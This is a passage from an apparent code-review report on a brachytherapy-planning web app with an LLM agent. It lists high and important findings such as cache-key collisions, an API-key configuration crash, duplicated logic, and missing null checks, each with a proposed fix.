| **File** | `web/routes/viewer_routes.py` |
| **Line** | 964 |
| **Severity** | HIGH — cache eviction shifts ~48 elements on average per call |

**Problem:** The mesh cache eviction uses `list.pop(0)` which is O(n):

```python
# viewer_routes.py:964
_MESH_CACHE_ORDER.pop(0)    # ← O(n): shifts all remaining elements
```

For a cache of 96 items, `_MESH_CACHE_MAX_ITEMS`, `pop(0)` shifts ~48 elements on average. This runs under `_MESH_CACHE_LOCK`, so it blocks all other cache operations during the shift.

**Impact:** Under concurrent requests (e.g., a user rotating a 3D view that loads many mesh slices), cache evictions cause lock contention. The O(n) memory shift is pure overhead for a data structure that could be O(1).

**Fix:** Use `collections.deque` which has O(1) `popleft()`:
```python
from collections import deque

_MESH_CACHE_ORDER: deque = deque()

# Append:
_MESH_CACHE_ORDER.append(cache_key)

# Evict:
old_key = _MESH_CACHE_ORDER.popleft()  # O(1)
```

---

## H16. Import inside loop — executed for every unique OAR label

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 610-616 |
| **Severity** | HIGH — 100× import cost per request |

**Problem:** The import is inside a `for` loop over unique OAR labels:

```python
# viewer_routes.py:610-616
for label in unique_labels:
    if label > 0:
        ...
        try:
            from tool_factory.OAR_seg.totalsegmentator_oar import TOTALSEG_LABEL_MAPPING
            organ_names_generated[label_int] = TOTALSEG_LABEL_MAPPING.get(label_int, ...)
        except ImportError:
            ...
```

If `oar_array` has 100 unique labels (common for TotalSegmentator output with 104+ organ classes), the import executes 100 times. Python caches imports after the first execution, so each subsequent "import" is just a `sys.modules` dict lookup — not disk I/O, but still ~100 unnecessary function calls per request.

**Impact:** Unnecessary latency on every OAR label loading request. The import is inside a `try` block, so an `ImportError` is caught 100 times instead of once.

**Fix:** Move the import to module level or outside the loop:
```python
# At module level:
try:
    from tool_factory.OAR_seg.totalsegmentator_oar import TOTALSEG_LABEL_MAPPING
    _HAS_TOTALSEG = True
except ImportError:
    _HAS_TOTALSEG = False
    TOTALSEG_LABEL_MAPPING = {}

# Inside the loop:
if _HAS_TOTALSEG:
    organ_names_generated[label_int] = TOTALSEG_LABEL_MAPPING.get(label_int, ...)
```

---

## H17. Dual `renderDoseOverlay` implementations — maintenance divergence risk

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-3d-manual.js` |
| **Line** | 2046 (old), 1997 (new) |
| **Severity** | HIGH — two versions of same logic; one may become stale |

**Problem:** Two different implementations of the same dose overlay rendering logic:

1. **`renderDoseOverlay(axis, sliceIndex, sliceData)`** (line 2046) — renders directly onto the CT slice canvas
2. **`renderDoseOverlayOnLayer(doseCanvas, axis, sliceIndex, sliceData)`** (line 1997) — renders onto a separate overlay canvas layer

Both take the same core parameters and produce the same visual output. The only difference is the canvas target. Currently `renderDoseOverlay` appears unused — all new code uses `renderDoseOverlayOnLayer` via `renderDoseForCurrentSlice`.

**Impact:** If someone fixes a dose rendering bug (e.g., color mapping, contour alignment) in one implementation, the other retains the old buggy code. When `renderDoseOverlay` is eventually revived (or vice versa), the bug reappears.

**Fix:** Remove the unused implementation (`renderDoseOverlay`) and route all callers through `renderDoseOverlayOnLayer`:
```javascript
// Keep only one:
function renderDoseOverlayOnLayer(doseCanvas, axis, sliceIndex, sliceData) { ... }
// Remove: function renderDoseOverlay(axis, sliceIndex, sliceData) { ... }
```

---

## H18. `contour.level.toFixed(1)` without null check

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-3d-manual.js` |
| **Line** | 2293 |
| **Severity** | HIGH — `TypeError` if contour level is undefined |

**Problem:** `contour.level` is accessed and called with `.toFixed()` without checking if it exists:

```javascript
// 3d-manual.js:2293
const label = contour.level.toFixed(1);
```

Earlier in the function (line 2245), there's a guard:
```javascript
const level = contour.level || contour.level_rel;
```

But this does NOT prevent accessing `contour.level` directly at line 2280 and 2293. If the server returns contour data without a `level` field (only `level_rel`), `contour.level` is `undefined`, and `undefined.toFixed(1)` throws `TypeError: Cannot read properties of undefined`.

```javascript
// Line 2280:
const level = contour.level || contour.level_rel;    // level is now contour.level_rel

// Line 2293:
const label = contour.level.toFixed(1);               // ← Uses contour.level, NOT the local `level`!
```

**Impact:** If the server returns dose contour data with `level_rel` but without `level`, the 3D dose overlay rendering crashes with `TypeError`. The user sees a blank 3D view instead of dose contours.

**Fix:** Use the local `level` variable, not `contour.level`:
```javascript
const label = (level || 0).toFixed(1);
```

---

## H19. Dual language globals `_uiLanguage` vs `_i18nLang` — inconsistency

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-chat-core.js` |
| **Line** | 900 (`_uiLanguage`), 1165 (`_i18nLang`) |
| **Severity** | HIGH — some UI parts show Chinese while others show English |

**Problem:** Two parallel language tracking systems with different sources:

```javascript
// chat-core.js:900 — set by SSE start event (SERVER-detected language)
window._uiLanguage = data.language.code;

// chat-core.js:1165 — set by global UI toggle (USER preference)
window._i18nLang = getInitialLang();  // from localStorage
```

Different functions check different globals:
| Function | Uses | Source |
|----------|------|--------|
| `_footerI18n()` (line 443) | `window._uiLanguage` | Server-detected |
| `_chainI18n()` (line 714) | `window._uiLanguage || window._i18nLang` | Either |
| `window._t()` (line 1214) | `window._i18nLang` | User preference |
| `updateImageAnalysis()` | `window._i18nLang` | User preference |

**Example scenario:**
1. User types in Chinese → server detects Chinese → `_uiLanguage = 'zh'`
2. User clicks EN button → `_i18nLang = 'en'`
3. Footer text sees 'zh' (Chinese), report strings see 'en' (English), chain text sees 'zh' (first match)

**Impact:** Users experience a mixed-language UI where some parts (footer, step chain) show Chinese while other parts (reports, static labels) show English. This is confusing and unprofessional.

**Fix:** Consolidate to a single source of truth:
```javascript
// Single function, single global:
function getEffectiveLanguage() {
    return window._i18nLang || window._uiLanguage || 'en';
}
```

Replace all `window._uiLanguage` and `window._i18nLang` checks with `getEffectiveLanguage()`.

---

## H20. `_MESH_CACHE` key uses `id(mask_data)` — memory address collision risk

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 861 |
| **Severity** | HIGH — stale cache hit if old memory address is reused |

**Problem:** The cache key uses Python's `id()` which returns the memory address of the object:

```python
# viewer_routes.py:861
cache_key = (source, label_id, str(smoothing_key), id(mask_data), mask_shape_key, total_voxels)
```

`id(mask_data)` returns the CPython memory address of the `mask_data` numpy array. If that array is garbage-collected and a new array is allocated at the same address (highly likely on a busy server), the cache returns stale mesh data for a semantically different input.

The cache also only checks `source`, `label_id`, `total_voxels`, and `mask_shape_key` — two different arrays with the same dimensions and voxel count but different spatial distributions produce the same cache key but should have different meshes.

**Impact:** Users may see incorrect mesh geometry (e.g., CTV contour from a previous patient on a new patient's scan) when memory addresses happen to collide. This is a data contamination risk for clinical review.

**Fix:** Use a content-based hash instead of `id()`:
```python
import hashlib
mask_hash = hashlib.md5(mask_data.tobytes()).hexdigest()
cache_key = (source, label_id, str(smoothing_key), mask_hash, mask_shape_key, total_voxels)
```
Or use a generation counter:
```python
_MESH_GENERATION = 0
cache_key = (source, label_id, str(smoothing_key), _MESH_GENERATION, mask_shape_key, total_voxels)
```

---

## H21. 500 error handler doesn't log exception — debugging impossible

| Field | Value |
|-------|-------|
| **File** | `web/server.py` |
| **Line** | 855-857 |
| **Severity** | HIGH — internal server errors invisible in production |

**Problem:** The 500 error handler catches the exception object but never logs it:

```python
# server.py:855-857
@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500
    # ← 'e' is never logged!
```

The Flask `app.errorhandler` receives the exception object `e`, but the handler just returns a generic JSON response without recording the exception. The original traceback is lost because Flask's default error logging is suppressed by the custom handler.

**Impact:** When an internal server error occurs (e.g., a bug in a route handler, an unexpected database error), the server returns a generic 500 with no indication of what went wrong. Developers must reproduce the error locally with debug mode enabled to diagnose. In production, errors are completely invisible — no logs, no metrics, no alerts.

**Fix:** Log the exception before returning:
```python
@app.errorhandler(500)
def server_error(e):
    logger.exception("Internal server error")  # ← Logs full traceback
    return jsonify({"error": "Internal server error"}), 500
```

---

## H22. `API_KEY=None` crash when `BRACHYBOT_REQUIRE_API_KEY=1`

| Field | Value |
|-------|-------|
| **File** | `web/server_support.py` |
| **Line** | 56-59, 947-956 |
| **Severity** | HIGH — `AttributeError: 'NoneType' has no attribute 'encode'` |

**Problem:** The authentication logic allows a configuration where `_API_KEY_REQUIRED = True` but `API_KEY = None`:

```python
# server_support.py:56-59
_API_KEY_REQUIRED = (bool(API_KEY) and not _TRUST_NETWORK) or \
    os.environ.get("BRACHYBOT_REQUIRE_API_KEY", "").lower() in TRUE_VALUES
```

If `BRACHYBOT_REQUIRE_API_KEY=1` is set but `BRACHYBOT_API_KEY` is NOT set, then:
- `bool(API_KEY)` is `False` (API_KEY is None)
- `_API_KEY_REQUIRED` is still `True` (from the env var)
- `API_KEY` is still `None`

This causes crashes in two places:

```python
# server_support.py:947-949 — _valid_api_key_from_request:
hashlib.sha256(request_key.encode()).hexdigest()
# ... but reaches this first:
hashlib.sha256(API_KEY.encode()).hexdigest()  # ← AttributeError: NoneType has no 'encode'

# server_support.py:955-956 — _screenshot_signature:
return hmac.new(API_KEY.encode("utf-8"), ...)  # ← Same crash
```

**Impact:** If an administrator sets `BRACHYBOT_REQUIRE_API_KEY=1` without also setting `BRACHYBOT_API_KEY`, the server starts successfully but crashes on the first request that requires authentication or screenshot signing. The error message ("'NoneType' object has no attribute 'encode'") is opaque and doesn't hint at the configuration issue.

**Fix:** Either generate a random key when enforcement is requested but no key is provided:
```python
if not API_KEY:
    API_KEY = secrets.token_urlsafe(32)
    logger.info("Generated random API key (BRACHYBOT_REQUIRE_API_KEY=1 without BRACHYBOT_API_KEY)")
```
Or refuse to start with a clear error:
```python
if _API_KEY_REQUIRED and not API_KEY:
    raise RuntimeError("BRACHYBOT_REQUIRE_API_KEY=1 but BRACHYBOT_API_KEY is not set")
```

---

# IMPORTANT (25)

---

## I1. `get_status()` checks wrong memory key `ct_data`

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/chat_workflows.py:1930` |
| **Severity** | IMPORTANT — `get_status()` always returns `"ct_loaded": False` |

**Problem:** `self.memory.retrieve("ct_data")` — the key `"ct_data"` is never stored anywhere. The actual key used everywhere is `"ct_image"`:

```python
# chat_workflows.py:1930 — WRONG KEY:
"ct_loaded": self.memory.retrieve("ct_data") is not None,

# Everywhere else — CORRECT KEY:
# llm_runtime.py:48: self.memory.retrieve("ct_image")
# llm_runtime.py:551: self.memory.store("ct_image", ct_img)
# chat_workflows.py:582: self.memory.retrieve("ct_image")
```

**Impact:** The `get_status()` API endpoint always returns `"ct_loaded": False`, even when a CT is fully loaded in agent memory. Any client-side logic that checks this status (e.g., frontend "CT loaded" indicator, training monitor readiness check, pre-planning validation) will always think no CT is loaded.

**Fix:** Change `"ct_data"` to `"ct_image"`:
```python
"ct_loaded": self.memory.retrieve("ct_image") is not None,
```

---

## I2. Dead `session_context` parameter in planning routes

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py:57` |
| **Severity** | IMPORTANT — parameter passed but never used |

**Problem:** `register_planning_routes` accepts a `session_context` parameter containing `_sessions`, `_session_timestamps`, etc., but never references it in the function body:

```python
# planning_routes.py:57
def register_planning_routes(app, get_agent, session_context=None):
```

The call site at `server.py:827` passes a fully populated dict:
```python
register_planning_routes(app, get_agent, session_context={
    "sessions": _sessions,
    "session_timestamps": _session_timestamps,
    "sessions_lock": _sessions_lock,
    "default_session_id": _default_session_id,
    "session_timeout": _session_timeout,
    "max_sessions": _max_sessions,
})
```

All route handlers use `get_agent()` (the closure parameter) instead of `session_context`. The entire dict is dead code.

**Impact:** Misleading API. Future maintainers might add session access via `session_context` instead of the canonical `get_agent()` closure, introducing session management bugs and inconsistent locking patterns.

**Fix:** Remove the parameter and the call-site argument, or add a documentation comment explaining it's reserved.

---

## I3. 55+ production `console.log` calls across JS files

| **File** | **Approx count** |
|----------|-----------------|
| `brachybot-dvh-planning.js` | ~30 (lines 341-1206) |
| `brachybot-3d-manual.js` | ~25 (lines 800-1879) |
| `brachybot-chat-core.js` | 2 (lines 29, 91) |
| `brachybot-chat-todo.js` | Many (lines 1051-1240) |
| `brachybot-viewer-layout.js` | Several |

Examples:
```javascript
// dvh-planning.js
console.log('[drawDVH] called');
console.log('[refreshPlanningUI] CALLED, stack:', new Error().stack);

// 3d-manual.js
console.log('addMeshToScene:', source, labelId);
console.log('Dose overlay slice loaded');
```

**Impact:** Console noise in production makes it hard to identify real issues. Slight performance overhead from string serialization and stack trace generation in hot paths (DVH rendering, 3D scene updates). Some log lines expose internal state that could confuse users who open DevTools.

**Fix:** Gate debug logging behind a global flag:
```javascript
if (window._DEBUG_BRACHYBOT) {
    console.log('[drawDVH] called');
}
```

Remove all unconditioned `console.log`/`console.warn` calls. Keep only `console.error` for actual error conditions.

---

## I4. `data_available` never populated in `conversation_state`

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/core.py:131` |
| **Severity** | IMPORTANT — dead state key |

**Problem:** The `conversation_state` dict initializes `"data_available"` as an empty list but nothing ever writes to it:

```python
# core.py:131
self.conversation_state: Dict = {
    "ctv_segmented": False,
    "oar_segmented": False,
    "planning_completed": False,
    "last_tool_calls": [],
    "data_available": [],     # ← Never populated
}
```

**Impact:** If any code reads `conversation_state["data_available"]` to determine what data is loaded, it always gets an empty list. This could cause false negatives in data availability checks. The key is technically dead state — it initializes memory that's never updated.

**Fix:** Either remove the key or implement population logic that tracks loaded data types.

---

## I5. `dose_calc` used instead of `dose_engine` in planning tool set

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/core.py:1180-1183` |
| **Severity** | IMPORTANT — planning detection misses `dose_engine` calls |

**Problem:** The `planning_tools` set used for determining if planning has been performed contains wrong tool names:

```python
# core.py:1180-1183
planning_tools = {"ctv_segmentation", "oar_segmentation",
                  "planning_pipeline", "seed_planning",
                  "dose_calc", "dose_evaluation",                     # ← "dose_calc" not "dose_engine"
                  "trajectory_init", "trajectory_refine"}             # ← sub-step names, not tool names
```

The actual tool names registered in the system are `dose_engine` and `trajectory_planning`. The sub-step names `dose_calc`, `trajectory_init`, `trajectory_refine` are internal operation names, not tool registration keys.

**Impact:** If `dose_engine` is the only planning tool called (common in step-by-step planning), the `is_planning` check fails, and the brief-response prompt is used instead of the comprehensive planning template. Users get abbreviated responses even after dose calculation.

**Fix:** Use the actual tool registration names:
```python
planning_tools = {"ctv_segmentation", "oar_segmentation",
                  "planning_pipeline", "seed_planning",
                  "dose_engine", "dose_evaluation",
                  "trajectory_planning"}
```

---

## I6. `print()` instead of `logger` in production code

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py:1737,1740,1743` |
| **Severity** | IMPORTANT — diagnostic data written to stdout |

**Problem:** Debug `print()` statements are left in production code:

```python
# AgenticSys.py:1737
print(f"[STORE] Skipping {tool_name}: not successful")

# AgenticSys.py:1740
print(f"[STORE] {tool_name}: metadata keys={list(meta.keys())}")

# AgenticSys.py:1743
print(f"[STORE] Storing ctv_array, shape={...}")
```

**Impact:** `print()` writes to stdout, which may expose internal diagnostic data in server logs or console output. In production deployments with log aggregation, these messages mix with structured logging and are harder to filter. They also cannot be controlled by log level settings — they always output.

**Fix:** Replace with `logger` calls:
```python
logger.debug("Skipping %s: not successful", tool_name)
logger.debug("%s: metadata keys=%s", tool_name, list(meta.keys()))
```

---

## I7. `_has_completed_planning_in_steps` only checks `planning_pipeline`

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py:739-746` |
| **Severity** | IMPORTANT — misses planning done via individual tools |

**Problem:** The function only checks if `planning_pipeline` is in the completed steps:

```python
# AgenticSys.py:739-746
def _has_completed_planning_in_steps(self, steps=None):
    return bool(steps) and any(
        s.get("type") == "tool" and s.get("status") == "done"
        and s.get("tool") == "planning_pipeline"   # ← Only checks this one tool name
        for s in steps
    )
```

But the LLM loops at `llm_runtime.py:419-423` and `:1450-1454` check a BROADER set including `seed_planning`, `trajectory_planning`, `dose_engine`, `dose_evaluation`. If planning was done through individual tools instead of the unified pipeline:
1. `_has_completed_planning_in_steps` returns `False`
2. The safety-net regeneration at `chat_with_stream:751-764` runs
3. This may produce a duplicate report

**Impact:** Users who plan via individual tools (e.g., "run trajectory planning", "calculate dose") may receive duplicate reports — one from the LLM loop and one from the safety-net.

**Fix:** Broaden the check to match the LLM loop's detection set:
```python
planning_tool_names = {"planning_pipeline", "seed_planning", "trajectory_planning", "dose_engine", "dose_evaluation"}
return bool(steps) and any(
    s.get("type") == "tool" and s.get("status") == "done"
    and s.get("tool") in planning_tool_names
    for s in steps
)
```

---

## I8. `organ_counts.get(n, 0)` with name key is always 0

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/chat_workflows.py:829-833` |
| **Severity** | IMPORTANT — sort key never matches, sort is no-op |

**Problem:** The sort lambda passes an organ NAME to a dict keyed by label ID:

```python
# chat_workflows.py:832
_key=lambda n: (self.memory.retrieve("organ_counts", {}) or {}).get(n, 0),
```

Here `n` is an organ name (string like "liver", "kidney") but `organ_counts` is structured like `{1: 1000, 2: 500, 3: 200}` (label ID → voxel count). Calling `.get("liver", 0)` always returns `0` because `"liver"` is not a key in the dict.

**Impact:** The organ list shown to the user is sorted alphabetically (the natural order when all sort keys are 0) rather than by voxel count (largest organs first). This means the user sees organs in alphabetical order instead of clinical relevance order.

**Fix:** Look up via `organ_names` mapping:
```python
organ_counts = self.memory.retrieve("organ_counts", {}) or {}
organ_names = self.memory.retrieve("organ_names", {}) or {}
_key=lambda n: next(
    (count for lid, count in organ_counts.items() if organ_names.get(lid) == n),
    0
)
```

---

## I9. `_chatHistory` array grows unbounded

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-chat-todo.js` |
| **Line** | 624 |
| **Severity** | IMPORTANT — memory leak over long sessions |

**Problem:** The `_chatHistory` array is initialized and appended to on every user input without any cap:

```javascript
// chat-todo.js:624
const _chatHistory = [];

// Pushed on every Enter keypress:
// chat-todo.js:~650
_chatHistory.push({ text, ts: Date.now(), options });
```

**Impact:** Over a long session with thousands of messages, the array consumes increasing memory. It's never trimmed or limited. On a machine with limited memory (e.g., the clinical workstation this will run on), this could cause the page to slow down or crash after extended use.

**Fix:** Cap the history:
```javascript
_chatHistory.push({ text, ts: Date.now(), options });
if (_chatHistory.length > 500) {
    _chatHistory.splice(0, _chatHistory.length - 500);  // Keep last 500
}
```

---

## I10. `dataTreeState.planning.seeds.forEach` without null guard

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-viewer-volume.js` |
| **Line** | 2002-2004 |
| **Severity** | IMPORTANT — throws if seeds/needles/doseLevels is null |

**Problem:** `soloGroup` traverses planning sub-arrays without null checks:

```javascript
// viewer-volume.js:2002-2004
dataTreeState.planning.seeds.forEach(s => { s.visible = (category === 'planning_seeds'); });
dataTreeState.planning.needles.forEach(s => { s.visible = (category === 'planning_needles'); });
dataTreeState.planning.doseLevels.forEach(d => { d.visible = (category === 'planning_dose'); });
```

If planning data hasn't been loaded yet (no seeds, needles, or dose levels), these objects may be `undefined` or `null`, and `.forEach()` throws `TypeError: Cannot read property 'forEach' of undefined`.

**Impact:** Clicking the "solo" button in the data tree before planning runs causes a JavaScript error. The data tree becomes unusable until page refresh.

**Fix:** Add optional chaining or guard:
```javascript
(dataTreeState.planning.seeds || []).forEach(s => { ... });
(dataTreeState.planning.needles || []).forEach(s => { ... });
(dataTreeState.planning.doseLevels || []).forEach(d => { ... });
```

---

## I11. `batchSetOpacity` / `setDataOpacity` may not be defined when referenced from `onclick`

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-viewer-volume.js:1666,2130` |
| **Severity** | IMPORTANT — slider/context menu breaks if function not defined |

**Problem:** Two inline `onclick`/`oninput` handlers reference functions that may not be defined:

```javascript
// viewer-volume.js:1666 — in renderTreeItem:
oninput="setDataOpacity('${id}', this.value)"

// viewer-volume.js:2130 — in context menu builder:
onclick="hideContextMenu();batchSetOpacity(${op / 100})"
```

The function `setDataOpacity` is defined at line 1683 (inside the same file) and `batchSetOpacity` at line 2122. Since both are loaded from the same file, they should be available. But because these are inlined `onclick` strings, they execute in the global scope. If these functions are declared with `function` keyword or `var` assignment, they become global. If declared with `const` or `let` at module level, they are NOT global and the onclick cannot find them.

**Impact:** If `setDataOpacity` or `batchSetOpacity` are declared with `const`/`let` (block-scoped, not global), clicking the slider or context menu item throws `ReferenceError`, and the opacity adjustment silently fails.

**Fix:** Use `addEventListener` in JavaScript instead of inline `onclick`:
```javascript
slider.addEventListener('input', () => setDataOpacity(id, slider.value));
```

---

## I12. Auto-OAR logic triplicated across 3 files (~130 lines each)

| **File** | **Lines** |
|----------|-----------|
| `AgenticSys.py` | 1200-1328 |
| `agent_runtime/llm_runtime.py` | 1929-2038 |
| `agent_runtime/chat_workflows.py` | 979-1206 |

**Problem:** The same 130-line "if CTV segmentation done and OAR not full, auto-run OAR segmentation" logic is independently copy-pasted into three execution paths. Each copy has slight variations:
- `AgenticSys.py` (inside `_execute_tool_with_memory`): synchronous, checks `conversation_state`
- `llm_runtime.py` (inside `_run_llm_function_calling_stream`): uses thread + heartbeat, different CTV-done detection
- `chat_workflows.py` (inside workflow enforcer): uses yet another CTV-loaded detection

**Impact:** Any bug fix or behavior improvement must be applied to all three copies. If only one is fixed, the bug persists in the other two paths. The variations in detection logic mean that auto-OAR may trigger in one execution mode but not another.

**Fix:** Extract into a single shared helper:
```python
def _auto_run_oar_if_needed(self, yield_event=None):
    """Check if CTV is done and OAR is not full, then auto-run OAR segmentation."""
    ctv_done = self.memory.conversation_state.get("ctv_segmented", False)
    oar_done = self.memory.conversation_state.get("oar_segmented", False)
    if ctv_done and not oar_done:
        oar_data = self.memory.retrieve("oar_array")
        if oar_data is None or ...:
            return self._execute_tool_with_memory("oar_segmentation")
    return None
```

---

## I13. 80% duplication between streaming and non-streaming LLM loops

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 31-696 (non-stream), 948-2237 (stream) |
| **Severity** | IMPORTANT — ~1300 lines duplicated, ~300 unique each |

**Problem:** The two LLM function-calling methods share approximately 80% of their logic:
- Enhanced context construction: ~40 lines × 2
- Forced search implementation: ~50 lines × 2 (with the C3 indentation bug in stream)
- Message building: ~50 lines × 2
- Tool iteration loop: ~100+ lines × 2
- Post-tool instruction: ~60 lines × 2
- Response fallback logic: ~100+ lines × 2

The streaming version has ~300 unique lines (text chunk yielding, tool_progress, heartbeat). The non-streaming has ~100 unique lines (response sentence stripping, token accumulation).

**Impact:** Every time a fix is applied to one method, it must be manually ported to the other. Currently, the streaming method has the C3 indentation bug that the non-streaming method doesn't have. Future fixes will likely diverge similarly.

**Fix:** Create shared helper functions:
```python
def _prepare_llm_messages(self, message, steps, ...) -> Tuple[str, List]:
    """Build system prompt and message history (shared by both streaming and non-streaming)."""
    ...

def _process_tool_results(self, tool_calls, ...) -> Tuple[str, List]:
    """Process tool call results (shared)."""
    ...

def _finalize_response(self, response_text, ...) -> str:
    """Clean and format the final response (shared)."""
    ...
```

The streaming loop then only contains SSE-yielding logic.

---

## I14. `_convert_anthropic_to_openai_messages` dead code

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py:1681-1732` |
| **Severity** | IMPORTANT — ~50 lines of zero-caller code |

**Problem:** The method `_convert_anthropic_to_openai_messages` is defined (52 lines) but never called anywhere in the codebase:

```python
# AgenticSys.py:1681-1732
def _convert_anthropic_to_openai_messages(self, messages: List) -> List:
    """Convert Anthropic-format messages to OpenAI-compatible format."""
    openai_messages = []
    for msg in messages:
        ...
    return openai_messages
```

All LLM providers already use OpenAI-format messages directly. This conversion function was likely written during a migration from Anthropic to OpenAI format and is now unused.

**Impact:** Dead code increases maintenance burden and confuses new developers who may wonder why Anthropic conversion exists when the system uses OpenAI format.

**Fix:** Remove the method.

---

## I15. `_global_agent` resolution pattern copy-pasted 8+ times in route files

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` (8+ occurrences) |
| **Severity** | IMPORTANT — repetitive code, update requires 8+ edits |

**Problem:** The agent resolution idiom `import AgenticSys as _ag; agent = getattr(_ag, '_global_agent', None) or get_agent()` appears in almost every route handler:

```python
# planning_routes.py:65, 109, 506, 566, 682, 766, 839, 1053 (etc.)
import AgenticSys as _ag
agent = getattr(_ag, '_global_agent', None) or get_agent()
if agent is None:
    return jsonify({"error": "Agent not initialized"}), 500
```

**Impact:** If the agent resolution pattern changes (e.g., `_global_agent` is renamed or `get_agent()` signature changes), all 8+ copies must be updated. Any missed copy introduces a subtle bug where some routes work and others don't.

**Fix:** Extract into a shared helper:
```python
# In server_support.py:
def _resolve_agent(get_agent):
    import AgenticSys as _ag
    agent = getattr(_ag, '_global_agent', None) or get_agent()
    return agent

# In each route handler:
agent = _resolve_agent(get_agent)
if agent is None:
    return jsonify({"error": "Agent not initialized"}), 500
```

---

## I16. `builtins` monkey-patch pollutes global namespace

| Field | Value |
|-------|-------|
| **File** | `web/server.py` |
| **Line** | 957-959 |
| **Severity** | IMPORTANT — potential conflict with other libraries |

**Problem:** The `run_server()` function injects objects into Python's builtins namespace:

```python
# server.py:957-959
import builtins
builtins.track_operation = _OperationContext
builtins.get_active_operations = get_active_operations
```

This pollutes the global namespace that ALL Python code sees. Any other library that iterates over builtins or checks for specific names will see these entries. If another library defines a `track_operation` function, it gets silently overwritten.

**Impact:** Unexpected behavior in any other code that reads `builtins`. If `get_active_operations` or `track_operation` ever need to be changed, stale references in other modules will use the old versions until those modules are reloaded.

**Fix:** Use a module-level registry or explicit dependency injection:
```python
# Instead of builtins:
_operation_registry = {}
```

---

## I17. Hardcoded upload path duplicates `UPLOAD_DIR` constant

| Field | Value |
|-------|-------|
| **File** | `web/server.py:272-273` |
| **Severity** | IMPORTANT — divergence risk if directory structure changes |

**Problem:** The `api_viewer_image` route computes the upload directory inline instead of using the shared constant:

```python
# server.py:272-273 — inline computation:
upload_dir = os.path.realpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "uploads"
))

# Compared to server_support.py:32-33 — shared constant:
PROJECT_ROOT = os.path.realpath(os.path.join(WEB_DIR, ".."))
UPLOAD_DIR = os.path.realpath(os.path.join(PROJECT_ROOT, "uploads"))
```

**Impact:** If the project directory structure changes, `UPLOAD_DIR` (the shared constant) gets updated, but the inline version in `api_viewer_image` becomes stale. The route would look for uploads in a non-existent directory, and image viewing breaks for all users.

**Fix:** Use the shared `UPLOAD_DIR` constant:
```python
# server.py — use imported UPLOAD_DIR:
if not image_path.startswith(UPLOAD_DIR + os.sep):
    return jsonify({"error": "Access denied"}), 403
```

---

## I18. `_captureScreenshot` — `.then()` inside `async` function loses promise

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-ui-api.js` |
| **Line** | 2075 |
| **Severity** | IMPORTANT — screenshot may be incomplete |

**Problem:** Inside an `async` function, `.then()` is used instead of `await`:

```javascript
// ui-api.js:2075
async function _captureScreenshot(target, ...) {
    ...
    html2canvas(el).then(canvas => {
        // Process canvas...
    });
    // ← Function returns here before .then() callback runs!
}
```

Because `await` is not used, the function returns a resolved promise before `html2canvas` finishes rendering. The caller gets the promise back, awaits it, and thinks the screenshot is complete — but the canvas capture may still be in progress.

**Impact:** Screenshots captured during planning or report generation may be blank, partially rendered, or contain stale content. The `_interceptScreenshot` function adds a 500ms setTimeout to mitigate this, but that's a workaround for the actual bug.

**Fix:** Use `await`:
```javascript
async function _captureScreenshot(target, ...) {
    ...
    const canvas = await html2canvas(el);
    // Process canvas...
}
```

---

## I19. `_interceptScreenshot` — race condition with 500ms setTimeout

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-ui-api.js` |
| **Line** | 2331 |
| **Severity** | IMPORTANT — rapid calls race; no abort mechanism |

**Problem:** The `_interceptScreenshot` function uses a 500ms `setTimeout` before capturing:

```javascript
// ui-api.js:2331
setTimeout(() => {
    _captureScreenshotDataUrl(normalizedTarget, el).then(dataUrl => {
        // use dataUrl
    });
}, 500);
```

If `_interceptScreenshot` is called twice rapidly (e.g., two SSE events fire quickly during planning), two timeouts are created. Both fire after 500ms, and both try to capture the same target. The second capture may:
1. See a different panel state (the first capture already switched panels)
2. Overwrite the first capture's result
3. Both try to switch to the same panel simultaneously

No `AbortController` or cancellation mechanism is used (unlike `fetchDoseOverlaySlice` in `3d-manual.js:1859-1891` which uses a version counter).

**Impact:** Screenshot ordering or content may be incorrect during rapid planning events. If the panel switch in `_resolveScreenshotTarget` is triggered twice, the second call might try to capture a stale target.

**Fix:** Add an abort mechanism:
```javascript
let _screenshotAbortController = null;

async function _interceptScreenshot(...) {
    if (_screenshotAbortController) {
        _screenshotAbortController.abort();
    }
    _screenshotAbortController = new AbortController();
    await new Promise(resolve => setTimeout(resolve, 500));
    if (_screenshotAbortController.signal.aborted) return;
    // ... capture
}
```

---

## I20. `reconstructOrgan3D` — hardcoded label IDs `[1, 2, 3, 4, 5, 6]`

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-viewer-layout.js` |
| **Line** | 680 |
| **Severity** | IMPORTANT — additional organs (labels >6) never reconstructed in 3D |

**Problem:** The 3D organ reconstruction loops over exactly 6 hardcoded label IDs:

```javascript
// viewer-layout.js:680
const labelIds = [1, 2, 3, 4, 5, 6]; // All non-background labels
```

TotalSegmentator produces 104+ organ classes with label IDs up to 119+. Any organ with a label ID >6 (e.g., liver=1, kidney=2, but also: spleen=3, pancreas=4, gallbladder=5, esophagus=6, stomach=7, duodenum=8, colon=9, etc.) is silently skipped. Labels 7+ are never reconstructed in 3D.

